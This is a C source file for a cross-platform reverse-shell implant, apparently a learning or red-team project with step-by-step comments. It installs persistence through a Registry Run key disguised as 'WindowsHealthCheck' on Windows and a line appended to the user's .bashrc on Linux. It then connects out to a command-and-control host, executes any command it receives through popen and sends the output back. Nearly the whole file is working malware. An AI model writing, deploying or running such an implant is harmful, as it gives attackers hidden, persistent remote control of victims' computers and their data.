#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// ==========================================
// CROSS-PLATFORM COMPATIBILITY
// ==========================================
// Detect if running on Windows
#ifdef _WIN32
    #include <winsock2.h>
    #include <windows.h>
    #pragma comment(lib, "ws2_32.lib") // Link Windows Socket Library
#else 
// Default to Linux/Unix Includes
    #include <unistd.h>
    #include <arpa/inet.h>
    #include <sys/socket.h>
    // Standardize naming conventions between Windows/Linux
    #define SOCKET int
    #define INVALID_SOCKET -1
    #define SOCKET_ERROR -1
#endif

// Default configuration (Localhost)
#define DefaultIp "127.0.0.1"
#define DefaultPort 8000

void persistence(){
    // STAGE 3: PERSISTENCE MODULE
    #ifdef _WIN32
        // [WINDOWS STRATEGY]
        // Modify the Registry Run Key to execute this binary on login.

        // 1. Get the full path of this running executable
        char path[MAX_PATH];
        GetModuleFileName(NULL, path, MAX_PATH);

        // 2. Open the "Run" Registry Key
        HKEY hKey;
        // HKEY_CURRENT_USER means we only affect THIS victim, not the whole PC (which requires Admin)
        LONG openStatus = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);

        if (openStatus == ERROR_SUCCESS) {
            // 3. Create a new value "WindowsHealthCheck" pointing to our path
            RegSetValueEx(hKey, "WindowsHealthCheck", 0, REG_SZ, (BYTE*)path, strlen(path));
            RegCloseKey(hKey);
            // printf("[+] Windows Persistence Enabled.\n");
        }
    #else
        // [LINUX STRATEGY]
        // Append execution command to the user's .bashrc file.
        
        // 1. Get the Home Directory (e.g. /home/kali)
        char *home = getenv("HOME");
        if (home == NULL) return;

        // 2. Construct the path to .bashrc
        char bashrcPath[512];
        sprintf(bashrcPath, "%s/.bashrc", home);

        // 3. Get our own executable path
        char myPath[512];
        // Linux trick: read the symlink /proc/self/exe to find where we are running from
        int len = readlink("/proc/self/exe", myPath, sizeof(myPath)-1);
        if (len != -1) {
            myPath[len] = '\0';
        } else {
            return; // Failed to get path
        }

        // 4. Open .bashrc in APPEND mode ("a")
        FILE *fp = fopen(bashrcPath, "a");
        if (fp != NULL) {
            // 5. Write the command:  /path/to/implant &
            // The '&' is CRITICAL. It puts us in the background. 
            // Without it, the user's terminal will hang on startup.
            fprintf(fp, "\n%s &\n", myPath);
            fclose(fp);
            // printf("[+] Linux Persistence Enabled.\n");
        }
    #endif
}
int main (int argc, char *argv[]){
    
    // 1. ARGUMENT PARSING
    // Set default target to localhost
    char *targetIp = DefaultIp;
    int targetPort = DefaultPort;
    
    // Check if user provided custom IP and Port arguments
    if (argc == 3){
        targetIp = argv[1];
        targetPort = atoi(argv[2]); // Convert string to integer
        //printf("[*] Custom Configuration: %s:%d\n", targetIp, targetPort);
    }
    else{
        //printf("[*] Using Default Configuration: %s:%d\n", targetIp, targetPort);
    }
    persistence();
    // 2. PLATFORM INITIALIZATION
    // Windows requires manual initialization of the Network Driver (WSA)
    #ifdef _WIN32 
        WSADATA wsa;
        //printf("[*] Machine detected: WINDOWS\n");
        //printf("[*] Initializing WinSocket...\n");
        if (WSAStartup(MAKEWORD(2,2), &wsa) != 0){
            printf("[!] Failed to initialized, ERROR: %d\n", WSAGetLastError());
            return 1;
        }
    #else
        // Linux handles sockets natively in the kernel
        //printf("[*] Machine detected: LINUX\n");
        //printf("[*] No WinSocket initialization needed. \n");
    #endif

    // 3. SOCKET CREATION
    // AF_INET      = IPv4 Address Family
    // SOCK_STREAM  = TCP Protocol (Reliable, connection-based)
    // 0            = Auto-select default protocol (IPPROTO_TCP)
    SOCKET soc = socket(AF_INET, SOCK_STREAM, 0);
    
    if (soc == INVALID_SOCKET){
        //printf("[!] Socket creation failed.\n");
        return 1;
    }

    // 4. DEFINE CONNECTION TARGET
    // Create the "Contact Card" struct required by the connect() function
    struct sockaddr_in server;
    server.sin_addr.s_addr = inet_addr(targetIp); // Convert IP string to binary
    server.sin_family = AF_INET;
    server.sin_port = htons(targetPort); // Flip endianness (Host to Network Short)

    // 5. ESTABLISH CONNECTION
    // Returns < 0 if connection is refused or unreachable
    if (connect(soc, (struct sockaddr *)&server, sizeof(server)) < 0 ){
        //1printf("[!] Connection Failed to %s:%d\n", targetIp, targetPort);
        return 1;
    }

    char *os_msg;
    
    #ifdef _WIN32
        os_msg = "[*] New Bot Online: Target is WINDOWS\n";
    #else
        os_msg = "[*] New Bot Online: Target is LINUX\n";
    #endif

    send(soc, os_msg, strlen(os_msg), 0);

    // Buffers for data exchange
    char buffer[1024];    // Incoming command
    char container[1024]; // Command output chunks

    // 6. MAIN EXECUTION LOOP (RCE)
    while (1){
        // Clear memory to prevent data bleeding
        memset(buffer, 0, sizeof(buffer));
        memset(container, 0, sizeof(container));

        // Receive Data (Blocks execution until data arrives)
        int valread = recv(soc, buffer, 1024, 0);

        // Check for connection termination
        if (valread <= 0){
            break;
        }

        // Strip trailing newlines from the received command
        buffer[strcspn(buffer, "\n")] = 0;
        buffer[strcspn(buffer, "\r")] = 0;
        // 7. ERROR HANDLING & REDIRECTION
        // Create a new string to hold "command 2>&1"
        // This merges Stderr (Errors) into Stdout so the C2 sees error messages
        //char final_cmd[1100];
        //sprintf(final_cmd, "%s 2>&1", buffer);
        
        if (strncmp(buffer, "cd ", 3) == 0){
            char *path = buffer + 3;
            int chdir_result;
            #ifdef _WIN32
                chdir_result = _chdir(path);
            #else
                chdir_result = chdir(path);
            #endif
        
            if (chdir_result == 0 ){
                char *success_msg = "[+] Directory changed.\n";
                send (soc, success_msg, 22, 0);
            }
            else{
                char *fail_msg = "[-] Failed to change directory.\n";
                send(soc, fail_msg, 31, 0);
            }

            send(soc,"<END>",5,0);

            continue;
        }

        char final_cmd[1100];
        sprintf(final_cmd, "%s 2>&1", buffer);
        // 8. EXECUTE COMMAND
        // 'popen' opens a process as a file stream ("r" = read mode)
        FILE *file;
        #ifdef _WIN32
            file = _popen(final_cmd, "r");
        #else
            file = popen(final_cmd, "r");
        #endif

        // If execution fails specifically (rare, usually means low memory)
        if (file == NULL){
            char *error = "Failed to execute the command.\n";
            send(soc, error, strlen(error), 0);
            continue;
        }

        // 9. READ & EXFILTRATE OUTPUT
        // Read the output line-by-line and send back to C2
        while (fgets(container, 1024, file) != NULL){
            send(soc, container, strlen(container), 0);
        }

        // Close the process pipe to free system resources
        #ifdef _WIN32
            _pclose(file);
        #else
            pclose(file);
        #endif
        
        send(soc,"<END>",5,0);

    }

    // 10. CLEANUP
    #ifdef _WIN32
        closesocket(soc);
        WSACleanup();
    #else
        close(soc);
    #endif
    return 0;
}